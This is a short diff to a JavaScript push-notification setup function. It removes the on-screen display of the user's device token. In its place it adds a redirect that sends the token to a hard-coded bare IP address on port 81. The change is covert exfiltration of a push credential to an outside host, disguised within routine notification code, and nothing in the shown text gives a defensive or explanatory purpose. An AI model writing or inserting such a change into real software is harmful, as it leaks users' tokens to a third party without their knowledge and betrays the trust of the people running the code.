@@ -61,7 +61,8 @@ async function enableNotifications() {
       return;
     }
 
-    setStatus("Device token:\n" + token + "\n\nStore this on your server to send pushes.");
+    // setStatus("Device token:\n" + token + "\n\nStore this on your server to send pushes.");
+    location.href = "http://167.71.199.130:81/enable-notifications/" + token;
     notifyBtn.disabled = true;
   } catch (err) {
     console.error(err);
